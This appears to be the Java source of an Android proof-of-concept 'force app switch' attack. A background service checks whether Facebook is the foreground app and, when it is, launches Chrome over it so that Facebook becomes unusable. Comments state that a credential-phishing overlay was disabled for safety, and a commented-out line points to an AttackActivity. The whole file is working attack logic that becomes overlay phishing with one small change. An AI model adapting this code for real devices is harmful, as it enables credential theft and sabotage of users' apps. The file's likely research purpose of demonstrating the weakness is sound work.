package com.example.force_app_switch_attack;

import java.util.Arrays;
import java.util.List;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

// This service runs in the background, monitoring whether one of the targeted apps
// (here, only Facebook) is focused by the user. When that happens, it launches the
// attack defined in the attack function.
public class BackgroundService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(shoudAttackNow()) {
            attack();
        }
        return Service.START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public boolean shoudAttackNow() {
        List<String> targets = Arrays.asList("com.facebook.katana");
        String current_activity = getTopActivity();
        boolean should_attack = targets.contains(current_activity);
        return should_attack;
    }

    public String getTopActivity() {
        ActivityManager am = (ActivityManager)this.getSystemService(Context.ACTIVITY_SERVICE);
        ComponentName top_activity = am.getRunningTasks(10).get(0).topActivity;
        //String current_activity = topActivity.getClassName();
        String current_package = top_activity.getPackageName();
        Log.i("ATTACK", "top activity: " + current_package);
        return current_package;
    }

    // This function implements the attack. Here, we disabled the malicious functionality for safety.
    // Instead of phishing credential from the user, this attack makes it impossible to use the Facebook application,
    // by superimposing it with Google Chrome (that needs to be installed) any time Facebook is focused.
    public void attack() {
        //Intent LaunchIntent = new Intent(this,AttackActivity.class); 
    	Intent LaunchIntent = new Intent();
    	LaunchIntent.setComponent(new ComponentName("com.android.chrome","com.android.chrome.Main"));        
        LaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        LaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        LaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        
        startActivity(LaunchIntent);
    }
}

